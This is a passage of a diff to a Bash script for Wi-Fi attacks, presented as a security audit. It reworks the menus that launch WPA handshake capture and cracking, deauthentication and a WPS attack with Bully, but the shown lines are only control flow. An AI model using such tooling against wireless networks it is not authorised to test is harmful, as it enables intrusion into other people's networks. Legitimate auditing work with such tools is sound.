+        printf '\nCracking attempt finished/failed.\n'
+        printf 'Options:\n'
+        printf 'r) Return to Deauth Menu (Try capturing again)\n'
+        printf 'x) Exit this attack\n'
+        
+        local post_crack
+        read -r -p "Selection [r/x] (Default: r): " post_crack
+        post_crack="${post_crack:-r}"
+        
+        if [[ "${post_crack,,}" == "r" ]]; then
+            # Calling the function recursively to restart the attack menu
+            # This is the cleanest way to "go back" without complex loop structures
+            attack_wpa_handshake
+            return $? 
+        else
+            return 0
+        fi
+    done
 }
 
 # -----------------------------------------------------------------------------
@@ -1111,44 +1038,56 @@ main() {
     printf '========================================\n'
     printf '   Arch/Hyprland Wi-Fi Security Audit   \n'
     printf '========================================\n'
-    printf 'Version: 2.0.0 | PID: %d\n' "$$"
+    printf 'Version: 2.1.3 (Safe & Stable) | PID: %d\n' "$$"
     printf '\n'
-    
+
     check_deps
     setup_directories
     select_interface
     enable_monitor_mode
-    scan_targets
 
-    printf '\n'
-    printf 'Select Attack Vector:\n'
-    printf '1) WPA Handshake Capture + Crack\n'
-    printf '2) WPS Attack (Bully)\n'
-    printf '3) Exit\n'
-    
-    local attack_choice
-    read -r -p "Choice [1]: " attack_choice
-    attack_choice="${attack_choice:-1}"
+    while true; do
+        scan_targets
 
-    case "$attack_choice" in
-        1)
-            attack_wpa_handshake
-            ;;
-        2)
-            attack_wps
-            ;;
-        3)
-            log_info "Exiting."
-            exit 0
-            ;;
-        *)
-            log_err "Invalid choice."
-            ;;
-    esac
+        printf '\n'
+        printf 'Select Attack Vector:\n'
+        printf '1) WPA Handshake Capture + Crack\n'
+        printf '2) WPS Attack (Bully)\n'
+        printf '3) Exit\n'
+
+        local attack_choice
+        read -r -p "Choice [1]: " attack_choice
+        attack_choice="${attack_choice:-1}"
+
+        case "$attack_choice" in
+            1)
+                local result=0
+                # The || result=$? trick prevents 'set -e' from crashing the script
+                # when the function returns 2 (Back to Target)
+                attack_wpa_handshake || result=$?
+
+                if ((result == 2)); then
+                    log_info "Returning to network scan..."
+                    continue
+                fi
+                break
+                ;;
+            2)
+                attack_wps
+                break
+                ;;
+            3)
+                log_info "Exiting."
+                exit 0
+                ;;
+            *)
+                log_err "Invalid choice."
+                ;;
+        esac
+    done
 
     printf '\n'
     read -r -p "Press ENTER to cleanup and exit..."
 }
 
-# Execute main function
 main "$@"
